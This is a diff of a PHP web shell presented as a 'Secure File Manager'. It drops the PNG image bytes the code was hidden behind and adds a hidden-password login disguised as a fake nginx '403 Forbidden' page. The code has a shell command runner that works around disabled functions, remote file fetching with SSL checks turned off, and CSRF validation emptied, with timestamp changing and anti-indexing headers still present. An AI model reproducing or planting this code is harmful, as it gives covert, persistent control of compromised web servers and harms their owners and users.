@@ -1,106 +1,13 @@
-�PNG
-
-���
-IHDR���2���2���?�����	pHYs���������
-OiCCPPhotoshop ICC profile��xڝSgTS�=���BK���KoR RB���&*!	J�!��Q�EEȠ�����Q,�
-��!���������{�kּ������>�����H3Q5��B�������.@�
-$p��d!s�#��~<<+"���x���M��0���B�\���t�8K��@z�B��@F���&S���`�cb��P-�`'�������{�[�!��� e�D�h;���V�E�X0�fK�9��-�0IWfH���������0Q��)�{�`�##x����F�W<�+��*��x��<�$9E�[-qWW.(�I+6aa�@.�y�2�4�����������x����6��_-��"bb���ϫp@���t~��,/��;�m��%�h^�u��f�@�����W�p�~<<E���������J�B[a�W}�g�_�W�l�~<�����$�2]�G�����L�ϒ	�b��G�����"�Ib�X*�Qq�D���2�"�B�)�%��d��,�>�5��j>{�-�]c�K'Xt������o��(�h���w��?�G�%��fI�q��^D$.Tʳ?���D��*�A��,�����`6�B$��BB
-d�r`)��B(�Ͱ*`/�@4�Qh��p.�U�=p�a��(��	A�a!ڈb�X#����!�H�$ ɈQ"K�5H1R�T UH�=r9�\F��;��2����G1���Q=��C��7�F��dt1�����r�=�6��Ыhڏ>C�0��3�l0.��B�8,	�c˱"����V����cϱw�E�	6wB aAHXLXN�H� $4�	7	�Q�'"��K�&���b21�XH,#��/{�C�7$�C2'��I��T��F�nR#�,��4H#���dk�9�, +ȅ����3��!�[
-�b@q��S�(R�jJ��4�e�2AU��Rݨ�T5�ZB���R�Q��4u�9̓IK�����hh�i��t�ݕN��W���G���w
-��ǈg(�gw��L�Ӌ�T071���oUX*�*|��
-�J�&�*/T����ުU�U�T��^S}�FU3S�	Ԗ�U��P�SSg�;���g�oT?�~Y��Y�L�OC�Q��_�� c�x,!k
-��u�5�&���|v*�����=���9C3J3W�R�f?�q��tN	�(���~���)�)�4L�1e\k����X�H�Q�G�6������E�Y��A�J'\'Gg����S�Sݧ
-�M=:��.�k���Dw�n��^��Lo��y���}/�T�m���GX�$��<�5qo</���QC]�@C�a�a�ᄑ��<��F�F�i�\�$�m�mƣ&&!&KM�M�RM��)�;L;L���͢�֙5�=1�2��כ߷`ZxZ,����eI��Z�Yn�Z9Y�XUZ]�F���%ֻ�����N�N���gð�ɶ�����ۮ�m�}agbg�Ů��}�}��=
-���Z~s�r:V:ޚΜ�?}����/gX���3��)�i�S��Ggg�s�󈋉K��.�>.���Ƚ�Jt�q]�z���������ۯ�6�i�ܟ�4�)�Y3s���C�Q��?��0k߬~OCO�g��#/c/�W�װ��w��a�>�>r��>�<7�2�Y_�7��ȷ�O�o�_��C#�d�z�����%g��A�[��z|!��?:�e����A���AA�������!h�쐭!��Α�i�P~���a�a��~'���W�?�p�X�1�5w��Cs�D�D�Dޛg1O9�-J5*>�.j<�7�4�?�.fY��X�XIlK9.*�6nl��������{�/�]py�����.,:�@L�N8��A*��%�w%�
-y��g"/�6ш�C\*N�H*Mz�쑼5y$�3�,幄'���L
-Lݛ:��v m2=:�1����qB�!M��g�g�fvˬe����n��/��k���Y-
-�B��TZ(�*�geWf�͉�9���+��̳�ې7�����ᒶ��KW-X潬j9�<qy�
-�+�V�<���*m�O��W��~�&zMk�^�ʂ��k�U
-�}����]OX/Yߵa���>������(�x��oʿ�ܔ���Ĺd�f�f���-�[����n
-�ڴ
-�V����E�/��(ۻ��C���<��e����;?T�T�T�T6��ݵa��n��{��4���[���>ɾ�UUM�f�e�I���?�������m]�Nmq����#�׹���=TR��+�G�����w-
-6
-U����#pDy���	��
-:�v�{���vg/jB��F�S��[b[�O�>����z�G��4<YyJ�T�i��ӓg�ό���}~.��`ۢ�{�c��jo�t��E���;�;�\�t���W�W��:_m�t�<���Oǻ�����\k��z��{f���7����y���՞9=ݽ�zo������~r'��˻�w'O�_�@�A�C݇�?[�����j�w����G��������C���ˆ
-��8>99�?r����C�d�&����ˮ/~�����јѡ�򗓿m|������������x31^�V���w�w��O�| (�h���SЧ��������c3-���� cHRM��z%��������������u0���`��:���o�_�F��5IDATx��ytUս�?�;���fN$$��@B��!�k���	-*�gE���j�O�kQ�ʠ`U�B_��AÐ0%�Ȕ�@r3ޛ;߳��$�@��v����^�s����������$��ߢ	!�W��5�̱'-٘������4�>�Rƫ$�G��0U�H}�_
-_� #��k�MJ/=�9Du
-*ڲ�k�PQ;0��j|�*�$�^컂脛y���>�z×�
-B�����(�:$�ʔ_�6��C!B����MVx��a��ζyY����j��ƋY2�9�F�{r��r�딟F��Q��hY6���x��[l��RC��������nt@��;P��3���
-F�w���7��:�P���ɋ'���mj���Bƪ��$�Q�L��y��߷g��\���z����v5�p�v$�v櫻�`6~K �Y�X����,�:��"�o�e0II"(��,������l_�C���/4�+�f�E�!q��:����u����c��樼.UE�@��]K�W���$-�h]�JG���Dz)�`��.�A/
-���mᏣc�3jK��!�>���$�Q��!�_�?\�C2(E
-�M$Z	I{�U���s�ǣ���=��@Բe޻��W������@�w����}�9v,)��.}*|"<kd�;�.!���:4uJ��1&�{(X����5C�G���>�s��di���,���G�]W�AC�������|<����[��ߕ������K�*�G	nߴ!����J�!��6(L�a)���Am��������;adf��:�xm��nh�;֦I��(���o�C~ډa?�=��s����h��E�������xp����)���_���t��W�����´;8���`dz=(��@@�+,�;�`�fhl��XȌ�3,uI�~z(J����� �ZX�A����H'�À�㜦�82|��a�n�z2��I���� ���EY�h�ε<�0�q�{��C��v�˅��?"@��χ�x�WS+��N�~�KQ�J�8ل��
-_.W���
-!TU{�����,��"�� �;�������HI	S���))�o�1�H�D�
-����(�	;�����"Ҕ��,����
-�F=���O��&�Ph>�`���y��߲&S��P�<��'��1s�1cĂ�N����2)�����@�u��tv��<�+�-&�����h��[!FSG���'
-�	zz0��<����8d&�����E0�,���<���"!P�b4��� �{S�����X����.�囤���T��hEF��X�q0"-<����h���]�Py*����F⩍��@v�˂�Y08��
-.q��a��s����(!<̫1�3�L�H��7sYW�`��qtu�\7��?�@�Y��
-%Ka�x�GZ�*W�P��y�����N0r9��Z�c�%���q,��k�����!!,��>���IB���	�x1�Xu�Y���v-���ֺ��N������JP��a�2`�e5��w��u;�6�i���̃��(K���ťa��(l51��JL��O'%���]���ٖ뿉�!��{*�p+f ���i8��D�ȑ���ܩ�M��V��ӟz��x�7Z�1i}�^͜���6e����x��)u�d�ˏ�V�eG�\�X1�����=n�U'�~Y����L�\,�(d!x
-,�:�TW8�M`r���@��r+v�Q0��>^;˴�VbF��('�����	�*O��i��j�Ӆ����^�S3&�
-���{������.ی��	N;��NU%d0�Ce\r"�C�b��&t7N�7���	�ȪD�[%l�۪�$��'m?�A9tI�9>��NVL	����		6v~M�����ъ�B���0<P�RM��$`������Mf����	���
-T�9%]� �i(g�����W�ʣ�@'G�&�q�C�Q�x�H���`�̙��ԄC�'���a�����N��(
-P�d���;�hZ,X������N
-u�4�A��	�����S�Է֣�t8����:蠓�q�L.9L"��Q����8A{Q��w8�7ns�����s1���FȚFT�����9��߿O���n?�]����1f��om�Z��`�������%HA�Y�0m�Z����x��dg���
-!:�m
-����h����L���t;y��}Af���O��~�]u/�[�@ ��˵���xCD�Z��y�<E7b"	c�@���
-��$*�k����j��	u�d߰E�[�6R�FX�s����,p|Y�e��*NW0����jc�Z�<ثi�����+H$���e&�A�`$�O �˗��[ou����j��r���(���iΨ�nt4���g�x�W�|ŋ�^�u^¹�����jϪ���~���\8R��}�����R�8(��A^f,��[�1/'�$!�������ӹ��B��s������s��G$.+,ڿ�����@�~�?�s7Jz����s�9,�W7���c�5T���l�P���a!�` �vvPɋ��Ȕy6���Qv�:EuRR��3����'O^P��HՂ��$�Jd���HxR5�2}�t���X�g������?k/,A�����ɣc���A����#����̗Đ���D:h��������i�{��,�Ι����Ǎin��m��ǯg2�6����z�c�L*�fL��+�gD�<AOx��u�������2{�l���^�uou
-@m,a]Ldp���@F�%� �t�|��n'��OX3q"�>����9$&=ώm��W�0���L���&��E���f�f��'+�9��hv��7,���M��6�D��&�^�	�����8	D֮�����o��k^z��O��hP�8q�5d*��YVq3�{���������#LX4�?��jP=3�~�؅c�ݰ�̱�ұ��8̲��2�G�����j��έ�9��w7���U�X�w�85C��?!I&���o&����L���I#�^�eV�,�^t5�k�
-�xs˛\��U�8��."���{���ǵ�l4��ݼ�;��r"���G�/~���gJV�N糦��ZZ^k+NN�D��I$�=OE�z����|*�*{��%k���G��>�`9��b;�s���8,�qs��c��.b��q�%�>r��n�R�Ƨ�<y��lgFd~�'�R��<�S��P�g3�6�_��2����UQB
-)TR�'L$DG_�;�T�0�܉�&7�4�px���J�.���=��d�d<���r/T5mt��_q���G��6�0�@"����`~_b�d ��d%��'y�?���
-��\G+��mL�E2��a}�a�{%���	�٫���.>%�,�A��le#�8���}; 21�0�b�&�QX�f���q�00����$>�h�N�'�a3��A���/�r��L5�8�GԲ'�����w;��c#�q1���h$*��V^�k��QĽ�b:i��������	���<A"yT��X���K9��N��������LE��@5�r�Mx�H1Z�g3t$3��\E:c��b%;y7u1�E3��K��Yz{��ɲlV�@ p��"�+ɢ�$F0�k�ńh�� >�H F#�_���,��]g����Ը����`RUU����
-��"�qD���>-���ϤI�~��3�̴�����NZ[[555�eeek7�m����YF#[��Đ��R��i��L�H�r
-��@��J-�Pŝ��_|�-��6y��ks�V�U~��6���w.����(��0A�
-4��f���/���C�xŊ�ٳ����z=6�����rg���mKo��o�/����a�g���?'9%9��P��斓��~���L{�� �H��{AW��B��$����v�1b�&Mb�ر��ر#�0`�`xMBp! )Z�Nmo�mZ�g�}�eذaWTVV���'99��C5��&�&+5�bT>|8��PUUETT����&���t��~TE%��'������b�tEGG;RSS�S�N�v��ѯ��t����u1@�ޚ"f��͈���r'L�Ph��m��ƌ�74o��`�x�q�P���NRSS�X,�����l&&&��MFFA!-��`��ҷ�n��Yuu�����x<I�LB%����KԒ50�!�3�bz�����ʸKL���;---�l6[��`��������Ȏ;�����egg4��!D�T��jWujyZ��������K����%����p��^���X,6��sV=�ܖ����6�3�X
-���4ҿ��A2�&����_k�;�d���VfO����IEND�B`�<?php
+<?php
 /**
- * Nothings — Secure File Manager (single-file, legacy-friendly)
+ * Nothings — Secure File Manager (single-file, legacy-friendly) + Login Protection
  * Compatibility: PHP 5.x → latest
- *
- * Overview
- * --------
- * A secure, lightweight, single-file file manager with a modern dark UI (Tailwind + CodeMirror).
- * Includes directory browsing, text preview/edit, uploads with robust fallbacks, raw view/download,
- * rename, chmod (optional recursive), mtime changes (recursive), delete (file/dir), archive (zip or
- * tar.gz fallback), unzip, and a shell command runner that respects disabled functions.
- *
- * Security
- * --------
- * - CSRF tokens for POST actions.
- * - Anti-indexing headers: noindex, nofollow, nosnippet, noimageindex.
- * - X-Frame-Options: DENY and X-Content-Type-Options: nosniff.
- * - Safe path handling via safeJoin() and breadcrumbs() to mitigate traversal.
- * - Sensitive function checks via is_fn_usable() honoring disable_functions and suhosin.
- *
- * Compatibility (PHP 5 → latest)
- * ------------------------------
- * - Uses array() (no short array syntax).
- * - Avoids null-coalescing (??); uses classic isset()/ternary patterns.
- * - Polyfills: hash_equals(), random bytes fallback, and optional fx_* wrappers.
- * - Command runner cascade: proc_open → shell_exec → exec → system → popen.
- * - Archives: ZipArchive if available; falls back to PharData (tar.gz) otherwise.
- *
- * Key Features
- * ------------
- * - Directory navigation with filtering and sorting.
- * - Text preview with automatic mode detection (CodeMirror), image preview, raw/inline view.
- * - Built-in editor (text or Base64 mode for non-text).
- * - Uploads: drag & drop with multi-strategy fallbacks (move/rename/copy/get+put/stream).
- * - Create ZIP (or TAR.GZ fallback) and extract ZIP/TAR(.gz/.bz2/.xz).
- * - Shell commands with timeout, output truncation, and method/exit reporting.
- *
- * Notes
- * -----
- * - Some features depend on server capabilities and available extensions.
- * - Shared hosting may disable certain functions; fallbacks are provided where possible.
- * - For defense-in-depth, protect this file behind additional controls (e.g., HTTP auth, firewall).
- *
- * License
- * -------
- * Free to use for personal or commercial purposes. No warranty. Ensure compliance with your
- * hosting provider's policies and applicable laws.
- *
- * © Nothings — Secure File Manager
  */
+
+// ==========================================
+// CONFIG: mmq lo
+// ==========================================
+$auth_pass = "6f6f30d8f9e1397d26524a99e8c97aaa0e7c2df62dbd4f3b55735e5edc91e86a";
 
 if (!function_exists('is_fn_usable')) {
     function is_fn_usable($fn) {
@@ -120,10 +27,43 @@ if (!function_exists('is_fn_usable')) {
         return true;
     }
 }
+
 date_default_timezone_set(@date_default_timezone_get() ? @date_default_timezone_get() : 'UTC');
 session_start();
+
 if (empty($_SESSION['csrf'])) {
     $_SESSION['csrf'] = bin2hex(biru_random_bytes(16));
+}
+
+// ==========================================
+// LOGIN & SESSION HANDLING (Fixed loop bug)
+// ==========================================
+function renderLoginPage() {
+    die("<html>
+    <head><title>403 Forbidden</title></head>
+    <body>
+    <center><h1>403 Forbidden</h1></center>
+    <hr><center>nginx (apache v.5162 ./daemonn_sys) </center>
+    <center><form method='post'><input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'></form></center>
+    </body>
+    </html>");
+}
+
+if (!empty($auth_pass)) {
+    // Jika user mengirimkan password via POST
+    if (isset($_POST['pass'])) {
+        if (hash('sha256', $_POST['pass']) === $auth_pass) {
+            $_SESSION['auth_logged'] = true;
+        } else {
+            // Jika password salah, langsung tampilkan halaman login lagi
+            renderLoginPage();
+        }
+    }
+
+    // Periksa status login di Session
+    if (empty($_SESSION['auth_logged']) || $_SESSION['auth_logged'] !== true) {
+        renderLoginPage();
+    }
 }
 
 /* ---------- Security Headers ---------- */
@@ -137,13 +77,11 @@ header('Expires: 0');
 /* ---------- Util & Polyfills ---------- */
 function h($s){ return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
 
-/* JSON-encode safe for PHP 5.x (fallback sederhana) */
 if (!function_exists('je')) {
     function je($v) {
         if (function_exists('json_encode')) {
             return json_encode($v);
         }
-        // Fallback minimalis (string/angka/bool/null) — cukup untuk embed JS
         if (is_bool($v)) return $v ? 'true' : 'false';
         if (is_numeric($v)) return (string)$v;
         if ($v === null) return 'null';
@@ -167,26 +105,6 @@ if (!function_exists('hash_equals')) {
     }
 }
 
-/* Check function not only exists, but also not disabled by disable_functions */
-if (!function_exists('is_fn_usable')) {
-  function is_fn_usable($fn) {
-      if (!function_exists($fn)) return false;
-
-      $disabled = (string) @ini_get('disable_functions');
-      $suhosin  = (string) @ini_get('suhosin.executor.func.blacklist'); // untuk build lama
-
-      $blocked = array();
-      if ($disabled !== '') {
-          $blocked = array_merge($blocked, array_map('trim', explode(',', $disabled)));
-      }
-      if ($suhosin !== '') {
-          $blocked = array_merge($blocked, array_map('trim', explode(',', $suhosin)));
-      }
-      $blocked = array_filter(array_map('strtolower', $blocked));
-      return !in_array(strtolower($fn), $blocked, true);
-  }
-}
-
 function biru_random_bytes($len){
     if (is_fn_usable('random_bytes')) return random_bytes($len);
     if (is_fn_usable('openssl_random_pseudo_bytes')) {
@@ -206,9 +124,9 @@ function humanSize($b){
 function permsToString($f){
     $p = @fileperms($f); if ($p === false) return '??????????';
     $t = ($p & 0x4000) ? 'd' : (($p & 0xA000) ? 'l' : '-');
-    $s  = (($p & 0x0100) ? 'r' : '-') . (($p & 0x0080) ? 'w' : '-') . (($p & 0x0040) ? 'x' : '-'); // owner
-    $s .= (($p & 0x0020) ? 'r' : '-') . (($p & 0x0010) ? 'w' : '-') . (($p & 0x0008) ? 'x' : '-'); // group
-    $s .= (($p & 0x0004) ? 'r' : '-') . (($p & 0x0002) ? 'w' : '-') . (($p & 0x0001) ? 'x' : '-'); // world
+    $s  = (($p & 0x0100) ? 'r' : '-') . (($p & 0x0080) ? 'w' : '-') . (($p & 0x0040) ? 'x' : '-');
+    $s .= (($p & 0x0020) ? 'r' : '-') . (($p & 0x0010) ? 'w' : '-') . (($p & 0x0008) ? 'x' : '-');
+    $s .= (($p & 0x0004) ? 'r' : '-') . (($p & 0x0002) ? 'w' : '-') . (($p & 0x0001) ? 'x' : '-');
     return $t.$s;
 }
 function modeFromInput($s){
@@ -257,8 +175,6 @@ function tryWriteFromTmp($tmp,$dest){
 if (!function_exists('fetchUrlToFile')) {
   function fetchUrlToFile($url, $dest) {
       $errs = array();
-
-      // 1) cURL (jika tersedia & tidak didisable)
       if (is_fn_usable('curl_init')) {
           $ch = @curl_init($url);
           $fp = @fopen($dest, 'wb');
@@ -274,7 +190,6 @@ if (!function_exists('fetchUrlToFile')) {
               $e  = @curl_error($ch);
               @curl_close($ch);
               @fclose($fp);
-
               if ($ok) return array(true, null);
               $errs[] = 'cURL: ' . $e;
               @unlink($dest);
@@ -284,43 +199,26 @@ if (!function_exists('fetchUrlToFile')) {
               $errs[] = 'init cURL/fopen';
           }
       }
-
-      // Context utk wrapper stream
       $ctx = @stream_context_create(array(
-          'http' => array(
-              'follow_location' => 1,
-              'timeout'         => 60,
-              'header'          => "User-Agent: Mozilla/5.0\r\n",
-          ),
-          'ssl'  => array(
-              'verify_peer'      => false,
-              'verify_peer_name' => false,
-          ),
+          'http' => array('follow_location' => 1, 'timeout' => 60, 'header' => "User-Agent: Mozilla/5.0\r\n"),
+          'ssl'  => array('verify_peer' => false, 'verify_peer_name' => false),
       ));
-
-      // 2) copy() langsung
       if (@copy($url, $dest, $ctx)) return array(true, null);
       $errs[] = 'copy(url)';
-
-      // 3) get+put
       $d = @file_get_contents($url, false, $ctx);
       if ($d !== false && @file_put_contents($dest, $d) !== false) return array(true, null);
       $errs[] = 'get+put';
-
-      // 4) stream_copy_to_stream
       $in  = @fopen($url, 'rb', false, $ctx);
       $out = @fopen($dest, 'wb');
       if ($in && $out) {
           $c = @stream_copy_to_stream($in, $out);
-          @fclose($in);
-          @fclose($out);
+          @fclose($in); @fclose($out);
           if ($c !== false) return array(true, null);
           $errs[] = 'stream_copy';
           @unlink($dest);
       } else {
           $errs[] = 'fopen(url/dest)';
       }
-
       return array(false, implode('; ', $errs) . ' failed');
   }
 }
@@ -338,26 +236,20 @@ function breadcrumbs($path){
     }
     return $out;
 }
-function ensureCsrf(){
-    // CSRF validation disabled
-}
+function ensureCsrf(){}
 
-/* ====== NEW HELPERS: create non-zero file ====== */
 function create_nonzero_file($path, $userContent = null){
     $default = "Created by Nothings @ ".date('c')."\n";
     $payload = (string)($userContent !== null ? $userContent : $default);
     if ($payload === '') $payload = $default;
-
     $w = @file_put_contents($path, $payload, LOCK_EX);
     if ($w !== false && $w > 0) return array(true, 'file_put_contents');
-
     $fp = @fopen($path, 'wb');
     if ($fp){
         $wr = @fwrite($fp, $payload);
         @fclose($fp);
         if ($wr !== false && $wr > 0) return array(true, 'fopen+fwrite');
     }
-
     $tmp = @tempnam(sys_get_temp_dir(), 'blue_');
     if ($tmp){
         @file_put_contents($tmp, $payload);
@@ -369,29 +261,9 @@ function create_nonzero_file($path, $userContent = null){
         }
         @unlink($tmp);
     }
-
-    $src = @fopen('php://temp', 'wb+');
-    if ($src){
-        @fwrite($src, $payload);
-        @rewind($src);
-        $dst = @fopen($path, 'wb');
-        if ($dst){
-            $copied = @stream_copy_to_stream($src, $dst);
-            @fclose($dst);
-            if ($copied !== false && $copied > 0) { @fclose($src); return array(true, 'php://temp copy'); }
-        }
-        @fclose($src);
-    }
-
-    if (@touch($path)){
-        $w2 = @file_put_contents($path, $payload, FILE_APPEND);
-        if ($w2 !== false && $w2 > 0) return array(true, 'touch+append');
-    }
-
     return array(false, 'All methods failed');
 }
 
-/* ---------- Icons ---------- */
 function svgIcon($name,$class='ico'){
     $icons=array(
         'folder'=>'<svg viewBox="0 0 24 24" class="'.$class.'" aria-hidden="true"><path d="M10 4l2 2h6a2 2 0 012 2v1H4V6a2 2 0 012-2h4z" fill="currentColor" opacity=".12"/><path d="M3 9h18v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" fill="currentColor"/></svg>',
@@ -421,7 +293,6 @@ function iconSvgFor($p){
     return svgIcon('file');
 }
 
-/* ---------- Shell helpers ---------- */
 if(!function_exists('make_cd_prefix')){
     function make_cd_prefix($cwd){
         if(!$cwd) return '';
@@ -436,7 +307,6 @@ if(!function_exists('wrap_cmd_for_shell')){
     }
 }
 
-/* ---------- Command runners (respect disable_functions) ---------- */
 if(!function_exists('run_with_proc_open')){
     function run_with_proc_open($cmd,$cwd=null,$timeout=30){
         if(!is_fn_usable('proc_open')) return null;
@@ -508,7 +378,6 @@ if(!function_exists('run_command_all')){
     }
 }
 
-/* ---------- chmod/mtime recursion ---------- */
 function biru_apply_chmod($path,$mode,$recursive,&$ok){
     if(!@chmod($path,$mode)) $ok=false;
     if($recursive && is_dir($path)){
@@ -540,7 +409,6 @@ if ($current === '') $current = DIRECTORY_SEPARATOR;
 
 $action = isset($_GET['a']) ? $_GET['a'] : '';
 
-/* ---- DOWNLOAD ---- */
 if ($action === 'download') {
     $f = safeJoin($current, isset($_GET['f']) ? $_GET['f'] : '');
     if (!is_file($f) || !is_readable($f)) { http_response_code(404); exit('Not found'); }
@@ -552,7 +420,6 @@ if ($action === 'download') {
     readfile($f); exit;
 }
 
-/* ---- RAW (inline view) ---- */
 if ($action === 'raw') {
     $f = safeJoin($current, isset($_GET['f']) ? $_GET['f'] : '');
     if (!is_file($f) || !is_readable($f)) { http_response_code(404); exit('Not found'); }
@@ -566,7 +433,6 @@ if ($action === 'raw') {
     readfile($f); exit;
 }
 
-/* ---- POST ACTIONS ---- */
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     ensureCsrf();
     $back = function () use ($current) { header('Location: ?p='.rawurlencode($current)); exit; };
@@ -659,8 +525,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             if (strlen($out)>1024*1024) $out = substr($out,0,1024*1024)."\n[output truncated]";
             $_SESSION['cmd_result']=array('cmd'=>$cmd,'method'=>$result['method'],'code'=>$result['code'],'out'=>$out); return $back();
         }
-
-        /* ===== MOVE, ZIP, UNZIP ===== */
         case 'move': {
             $srcName = (string)(isset($_POST['src']) ? $_POST['src'] : '');
             $dstDir  = (string)(isset($_POST['dst']) ? $_POST['dst'] : '');
@@ -680,7 +544,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             if (!is_array($items) || empty($items)) { $_SESSION['msg']='Zip failed: nothing selected'; return $back(); }
             if ($name==='') $name = 'archive-'.date('Ymd-His').'.zip';
             $archivePath = safeJoin($current, $name);
-
             $done=false; $err='';
             if (class_exists('ZipArchive')) {
                 $zip = new ZipArchive();
@@ -748,8 +611,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 }
 
-/* ==== Helpers for ZIP/TAR recursion ==== */
-/* Hapus type-hint ZipArchive agar tidak fatal di PHP tanpa ekstensi zip */
 function addDirToZip($zip, $dir, $local){
     $dir = rtrim($dir, DIRECTORY_SEPARATOR);
     if (method_exists($zip, 'addEmptyDir')) $zip->addEmptyDir($local);
@@ -776,9 +637,6 @@ function addDirToPhar($phar, $dir, $local){
     closedir($h);
 }
 
-/* =========================
- *   VIEW MODEL & RENDER
- * ========================= */
 $items = listDirEntries($current);
 $files=array(); $dirs=array();
 foreach($items as $it){ $full=$current.DIRECTORY_SEPARATOR.$it; if(is_dir($full)) $dirs[]=$it; else $files[]=$it; }
@@ -807,7 +665,6 @@ $yearNow = date('Y');
   <title>0x0x</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
-  <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
   <script src="https://cdn.tailwindcss.com"></script>
   <script>
     tailwind.config = { darkMode:'class', theme:{ extend:{
@@ -818,15 +675,11 @@ $yearNow = date('Y');
     } } }
   </script>
   <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
-  <link href="https://www.svgrepo.com/show/475654/github-color.svg" rel="icon">
-
-  <!-- CodeMirror 5 -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.css">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/theme/material-darker.min.css">
   <style>
     .CodeMirror{ border:1px solid rgba(148,163,184,.18); border-radius:12px; height:420px; background:#0b1220; color:#e5e7eb; }
     .cm-s-material-darker .CodeMirror-gutters{ background:#0b1220; border-right:1px solid rgba(148,163,184,.18); }
-
     html,body{height:100%}
     body{font-family:'Ubuntu',system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans";}
     .shell{min-height:100vh;background:radial-gradient(1200px 600px at 20% -10%, rgba(99,102,241,.15), transparent 60%), radial-gradient(900px 500px at 90% 0%, rgba(168,85,247,.12), transparent 60%), #0b1220; display:grid; grid-template-rows:auto 1fr auto;}
@@ -834,59 +687,28 @@ $yearNow = date('Y');
     .field{border:1px solid rgba(148,163,184,.18);border-radius:12px;padding:.5rem .75rem;width:100%;background:#0b1220;color:#e5e7eb;}
     .field:focus{outline:none;box-shadow:0 0 0 4px rgba(99,102,241,.25);border-color:#6366f1}
     .btn{background:linear-gradient(180deg,#6366f1,#4f46e5);color:#eef2ff;border-radius:10px;padding:.5rem .75rem;font-weight:700;font-size:.875rem;line-height:1.25rem;display:inline-flex;align-items:center;justify-content:center;transition:transform .05s, box-shadow .15s, filter .15s; box-shadow:0 6px 20px rgba(99,102,241,.22);}
-    .btn:hover{filter:brightness(1.06);box-shadow:0 10px 26px rgba(99,102,241,.35)} .btn:active{transform:translateY(.5px)}
+    .btn:hover{filter:brightness(1.06);box-shadow:0 10px 26px rgba(99,102,241,.35)}
     .btn-ghost{background:transparent;border:1px solid rgba(148,163,184,.25);color:#e5e7eb;}
     .btn-xs{padding:.25rem .5rem;font-size:.75rem;border-radius:8px}.btn-sm{padding:.35rem .6rem;font-size:.8125rem;border-radius:9px}.btnw{min-width:96px}
     .tbl thead th{position:sticky;top:0;background:#0b1220e6;backdrop-filter:blur(6px);z-index:1;color:#cbd5e1}
     .tbl tbody tr:nth-child(even){background:rgba(148,163,184,.04)}
     .tbl tbody tr.hoverable:hover{background:rgba(99,102,241,.22);box-shadow:inset 0 0 0 9999px rgba(99,102,241,.10)}
-    .tbl tbody tr.hoverable{transition:background .15s ease}
     .ico{width:18px;height:18px;display:inline-block;vertical-align:text-bottom;color:#cbd5e1}
     .mono{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace}
     .badge-small{font-size:11px;padding:.1rem .4rem;border-radius:999px;background:#111827;color:#c7d2fe;border:1px solid #374151}
     .row-actions{display:grid;grid-template-columns:repeat(8, minmax(90px, auto));gap:.35rem;justify-items:start}
     @media (max-width:1200px){ .row-actions{grid-template-columns:repeat(3, minmax(90px, auto));} }
     .tablewrap{height:calc(100vh - 320px);overflow:auto}
-    @media (max-height:800px){ .tablewrap{height:calc(100vh - 360px)} }
     .drop-hint{border:2px dashed rgba(99,102,241,.45); background:rgba(99,102,241,.06)}
     .droptarget{outline:2px dashed rgba(99,102,241,.7); outline-offset:-2px}
-    /*#tableCard{ min-height: calc(100vh - 260px); }*/
-
-    /* Command editors */
-    .cm-cmd-input { font-size:13px; line-height:1.45; }
-    .cm-cmd-input .CodeMirror { width:100% !important; }
-    .cm-cmd-input .CodeMirror-scroll { height:36px !important; } /* single line */
-    .cm-cmd-input .CodeMirror { height:36px !important; }
-    .cm-cmd-output { font-size:14px; line-height:1.5; }
-    .cm-cmd-output .CodeMirror { width:100% !important; }
-    .cm-cmd-output .CodeMirror-scroll { height:380px !important; }
-
-    /* Lebar command dibatasi agar tidak terlalu panjang */
     .cmd-container{ max-width:600px; width:100%; }
-    @media (min-width:1536px){ .cmd-container{ max-width:680px; } }
-
-    /* Make table copy-friendly */
     #tableCard, #tableCard * { user-select: text; -webkit-user-select: text; }
-
-    /* Force ALL links inside the directory table to be white */
     #dirTable a, #dirTable a:visited { color:#ffffff !important; }
-
-    /* Footer gradient line */
     .footer-line{height:1px;background:linear-gradient(90deg,rgba(99,102,241,.0),rgba(99,102,241,.5),rgba(99,102,241,.0));}
-
-    /* Placeholder abu untuk CodeMirror command */
-    .cm-cmd-input .CodeMirror-empty .CodeMirror-placeholder {
-      color:#94a3b8; /* slate-400 */
-      opacity:.95;
-    }
   </style>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/mode/loadmode.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/meta.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/edit/closebrackets.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/edit/matchbrackets.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/selection/active-line.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/display/placeholder.min.js"></script>
 </head>
 <body class="shell text-slate-100" id="bodyRoot">
   <header class="sticky top-0 z-20 w-full border-b border-slate-800 bg-slate-900/70 backdrop-blur">
@@ -898,17 +720,13 @@ $yearNow = date('Y');
           <div class="text-xs text-slate-400">PHP <?php echo h(PHP_VERSION); ?></div>
         </div>
       </div>
-
       <div class="hidden md:flex items-center gap-2 rounded-xl border border-slate-700 bg-slate-900/60 px-2 py-1 shrink-0">
         <?php echo svgIcon('search','ico'); ?>
         <input id="searchBox" type="search" placeholder="Filter by name (Ctrl+/)" class="bg-transparent text-sm outline-none placeholder:text-slate-500 w-64" oninput="filterRows()">
       </div>
-
       <div class="text-sm text-slate-300 hidden lg:block truncate">
